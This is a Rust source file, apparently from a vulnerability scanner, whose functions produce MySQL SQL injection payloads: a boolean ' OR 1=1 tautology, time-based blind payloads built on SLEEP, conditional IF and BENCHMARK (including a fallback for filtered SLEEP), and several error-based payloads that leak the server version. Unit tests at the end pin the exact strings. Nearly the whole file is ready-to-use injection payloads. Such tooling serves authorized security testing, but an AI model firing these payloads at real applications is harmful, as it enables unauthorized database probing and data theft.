#![deny(unsafe_code)]
#[must_use]
pub fn mysql_boolean_true(comment: &str) -> String {
    format!("' OR 1=1{comment}")
}
#[must_use]
pub fn mysql_time_payload(secs: u64) -> String {
    format!("' AND SLEEP({secs}) -- -")
}

/// Conditional variant: only sleeps when the condition holds.
#[must_use]
pub fn mysql_time_conditional(secs: u64) -> String {
    format!("' AND IF(1=1,SLEEP({secs}),0) -- -")
}

/// CPU-burn fallback for hardened stacks where `SLEEP()` is filtered but
/// stacked expressions still evaluate. Fixed iteration count (~seconds of
/// `MD5` churn); caller keeps the same `sleep_secs` for threshold math.
#[must_use]
pub fn mysql_time_benchmark() -> String {
    "' AND BENCHMARK(5000000,MD5(1)) -- -".to_owned()
}
#[must_use]
pub fn mysql_error_payload() -> String {
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) -- -".to_owned()
}

/// Canonical MySQL error-based set — legacy first (compat), then variants.
///
/// - `[0]` legacy `EXTRACTVALUE` (byte-identical to [`mysql_error_payload`])
/// - `[1]` legacy `GROUP BY` double (`COUNT(*)` + `FLOOR(RAND(0)*2)`)
/// - `UPDATEXML(1,CONCAT(0x7e,@@version),1)` — `XPATH syntax error` channel
/// - `EXP(~(...))` — `BIGINT UNSIGNED value is out of range` overflow channel
/// - `JSON_KEYS(...)` — `Invalid JSON text` channel (MySQL 5.7+)
#[must_use]
pub fn mysql_error_payloads() -> Vec<String> {
    vec![
        mysql_error_payload(),
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -"
            .to_owned(),
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1) -- -".to_owned(),
        "' AND EXP(~(SELECT * FROM (SELECT @@version)x)) -- -".to_owned(),
        "' AND (SELECT JSON_KEYS(CONCAT(0x7e,@@version,0x7e))) -- -".to_owned(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_sleep_shape() {
        assert_eq!(mysql_time_payload(5), "' AND SLEEP(5) -- -");
    }

    #[test]
    fn conditional_shape() {
        assert_eq!(mysql_time_conditional(5), "' AND IF(1=1,SLEEP(5),0) -- -");
    }

    #[test]
    fn benchmark_shape() {
        assert_eq!(
            mysql_time_benchmark(),
            "' AND BENCHMARK(5000000,MD5(1)) -- -"
        );
    }
}
